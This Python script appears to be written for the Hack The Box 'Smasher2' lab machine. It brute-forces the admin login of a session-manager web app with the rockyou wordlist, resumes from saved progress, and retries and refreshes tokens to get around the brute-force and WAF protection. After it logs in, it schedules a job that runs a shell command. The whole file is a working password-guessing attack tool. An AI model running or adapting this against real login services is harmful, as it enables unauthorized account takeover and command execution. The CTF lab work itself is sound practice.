import requests
import json
import time
from termcolor import cprint
import sys
from base64 import b64decode

class Smasher:
    def __init__(self):
        self.savefile = open('./session.txt','r+')
        self.waittime = 1
        self.maxretries = 10
        self.s = requests.Session()
        self.wordlist = open('/usr/share/wordlists/rockyou/rockyou-c.txt','r')
        self.password = ""
        self.lastpassword = ""
        self.datadict = {}
        self.j = ""
        self.sectrip = False
        self.wafdetected = False
        self.resumed = False
        self.excepted = False
        self.retrycount = 0
        self.proxy = False
        self.proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
        }
        self.dev = False
        if self.dev:
            self.url = "http://127.0.0.1:5000"
        else:
            self.url = "http://wonderfulsessionmanager.smasher2.htb"
        self.resume()


    def log(self,level,message):
        colors = {
        'ok':'green',
        'info':'blue',
        'warning':'yellow',
        'error':'red',
        'misc':'magenta'
        }
        cprint(message,colors[level], file=sys.stdout)

    def getpassword(self):
        self.password = self.wordlist.readline().replace("\n","")
        self.savefile.seek(0)
        self.savefile.write(self.password)
        self.savefile.truncate()

    def resume(self):
        self.log('info','attempting to resume...')
        self.password = self.wordlist.readline().replace("\n","")
        try:
            self.lastpassword = self.savefile.readline()
            if self.lastpassword[0] == self.password[0]:
                while self.lastpassword != self.password:
                    self.getpassword()
            if self.lastpassword and self.password:
                self.resumed = True
                self.log('ok','resuming with password=%s'%self.password)
        except Exception as e:
            self.log('error',e)

    def closeFiles(self):
        self.savefile.close()
        self.wordlist.close()

    def refreshToken(self):
        self.s = requests.Session()
        self.s.get("%s/"%self.url)

    def trypassword(self,password):
        self.refreshToken()
        datadict = "{'username':'admin', 'password':'%s'}"%password
        postdata = '{"action":"auth","data":"%s"}'%datadict
        #postdata = json.dumps(postdata)
        self.log('info','%s/auth %s'%(self.url,postdata))
        if self.proxy:
            r = self.s.post(url="%s/auth"%self.url,json=postdata,headers={'Referer': 'http://wonderfulsessionmanager.smasher2.htb/login','Content-Type':'application/json'},proxies=self.proxies)
        else:
            r = self.s.post(url="%s/auth"%self.url,json=postdata,headers={'Referer': 'http://wonderfulsessionmanager.smasher2.htb/login','Content-Type':'application/json'})
        return r

    def evadeWAF(self):
        pass

    def detectWAF(self):
        wait = False
        if self.retrycount == self.maxretries and self.sectrip:
            self.log('error',"Banned by web security...Exiting")
            exit(0)
        if self.retrycount == self.maxretries and not self.sectrip:
            self.log('warning',"retry count reached... attempting to refresh token, extending wait time and trying 5 more times")
            self.waittime = 5
            self.maxretries = 5
            self.retrycount = 0
            self.sectrip = True
            self.refreshToken()
        if not self.excepted and not wait and not self.resumed:
            self.getpassword()
            self.resumed = False
        else:
            self.log('warning',"Brute Force security triggered... retrying %s"%self.password)
            self.retrycount += 1
            time.sleep(self.waittime)

    def run(self):
        self.refreshToken()
        self.retrycount = 0
        while True:
            self.detectWAF()
            try:
                r = self.trypassword(self.password)
                j = json.loads(r.text)
                if "wait" in r.text:
                    self.log('warning','Auth security activated... refreshing token')
                    wait = True
                    self.refreshToken()
                else:
                    wait = False
                    if self.sectrip:
                        self.log('ok','Recovered from web security... setting config to defaults.')
                        self.sectrip = False
                        self.retrycount = 10
                if j['authenticated']:
                    break
                else:
                    self.log('misc',"%s Failed %s %s"%(self.password,j['authenticated'],r.text))
                    time.sleep(.2)
                self.excepted = False
                self.retrycount = 0
            except Exception as e:
                self.log('error',"%s %s"%(str(e),r.text))
                self.excepted = True
        self.log('info',j)
        jobdict = json.dumps({'schedule':'pwd'})
        self.log('info',jobdict)
        r = self.s.post(url="%s/api/%s/job"%(self.url,j['result']['key']),json=jobdict)
        self.log('info',r.text)
        self.closeFiles()

smasher = Smasher()

smasher.run()
